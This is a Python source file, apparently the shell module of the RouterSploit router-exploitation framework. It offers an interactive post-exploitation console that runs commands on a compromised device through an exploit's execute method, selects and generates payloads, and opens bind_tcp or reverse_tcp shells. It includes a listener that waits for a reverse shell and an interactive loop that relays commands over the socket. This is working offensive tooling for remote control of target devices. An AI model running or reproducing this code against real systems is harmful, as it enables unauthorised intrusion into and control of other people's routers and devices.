import socket
import binascii
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import time
import importlib
import sys

from exploit.printer import (
    printer_queue,
    print_info,
    print_error,
    print_success,
    print_status,
    print_table,
)

from exploit.utils import (
    index_modules,
    random_text,
)


def shell(exploit, architecture="", method="", payloads=None, **params):
    available_payloads = {}
    payload = None
    options = []

    if architecture and method:
        all_payloads = [p.replace("payloads.", "").replace(".", "/") for p in index_modules() if "payloads.{}".format(architecture) in p]

        for p in all_payloads:
            module = getattr(importlib.import_module("routersploit.modules.payloads." + p.replace("/", ".")), "Payload")

            if method == "cmd":
                if getattr(module, "cmd") in payloads:
                    available_payloads[p] = module
            else:
                available_payloads[p] = module

    print_info()
    print_success("Welcome to cmd. Commands are sent to the target via the execute method.")
    print_status("For further exploitation use 'show payloads' and 'set payload <payload>' commands.")
    print_info()

    while True:
        while not printer_queue.empty():
            pass

        if payload is None:
            cmd_str = "\001\033[4m\002cmd\001\033[0m\002 > "
        else:
            cmd_str = "\001\033[4m\002cmd\001\033[0m\002 (\033[94m{}\033[0m) > ".format(payload._Payload__info__["name"])

        cmd = input(cmd_str)

        if cmd in ["quit", "exit"]:
            return

        elif cmd == "show payloads":
            if not available_payloads:
                print_error("There are no available payloads for this exploit")
                continue

            print_status("Available payloads:")
            headers = ("Payload", "Name", "Description")
            data = [(p, v._Payload__info__["name"], v._Payload__info__["description"]) for p, v in available_payloads.items()]
            print_table(headers, *data)

        elif cmd.startswith("set payload "):
            if not available_payloads:
                print_error("There are no available payloads for this exploit")
                continue

            c = cmd.split(" ")

            if c[2] in available_payloads.keys():
                payload = available_payloads[c[2]]()

                options = [[option, getattr(payload, option), attr[1]] for option, attr in payload.exploit_attributes.items() if option not in ["output", "filepath"]]

                if payload.handler == "bind_tcp":
                    options.append(["rhost", exploit.target, "Target IP address"])
                    if method == "wget":
                        options.append(["lhost", "", "Connect-back IP address for wget"])
                        options.append(["lport", 4545, "Connect-back Port for wget"])
            else:
                print_error("Payload not available")

        elif payload is not None:
            if cmd == "show options":
                print_info("\nPayload Options:")
                print_table(("Name", "Current settings", "Description"), *options)
                print_info()

            elif cmd.startswith("set "):
                c = cmd.split(" ")
                if len(c) != 3:
                    print_error("set <option> <value>")
                else:
                    for option in options:
                        if option[0] == c[1]:
                            setattr(payload, c[1], c[2])
                            option[1] = c[2]
                            print_info("{} => {}".format(c[1], c[2]))

            elif cmd == "run":
                data = payload.generate()
                communication = Communication(exploit, data, options, **params)

                if payload.handler == "bind_tcp":
                    communication.bind_tcp()
                elif payload.handler == "reverse_tcp":
                    communication.reverse_tcp()

            elif cmd == "back":
                payload = None

        else:
            print_status("Executing '{}' on the device...".format(cmd))
            print_info(exploit.execute(cmd))


class Communication:
    def __init__(self, exploit, payload, options, location="", **params):
        self.exploit = exploit
        self.payload = payload
        self.options = {option[0]: option[1] for option in options}
        self.location = location
        self.binary_name = random_text(8)

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            sock.bind((lhost, int(lport)))
            sock.listen(5)
            return sock
        except socket.error:
            print_error("Could not set up listener on {}:{}".format(lhost, lport))
            return None

    def reverse_tcp(self):
        sock = self.listen("0.0.0.0", self.options["lport"])
        if not sock:
            return

        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        print_success("Connection from {}:{}".format(addr[0], addr[1]))

        self.interactive_shell(client)

    def bind_tcp(self):
        print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
        time.sleep(2)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.options["rhost"], int(self.options["rport"])))
            print_success("Connected to target. Enjoy your shell.")
            self.interactive_shell(sock)
        except socket.error:
            print_error("Could not connect to {}:{}".format(self.options["rhost"], self.options["rport"]))

    def interactive_shell(self, sock):
        try:
            while True:
                cmd = input("Shell> ")
                if cmd in ["exit", "quit"]:
                    sock.sendall(cmd.encode() + b"\n")
                    break
                sock.sendall(cmd.encode() + b"\n")

                response = sock.recv(4096)
                if not response:
                    break
                sys.stdout.write(response.decode())
                sys.stdout.flush()
        except KeyboardInterrupt:
            print_info("\nClosing shell...")
        finally:
            sock.close()
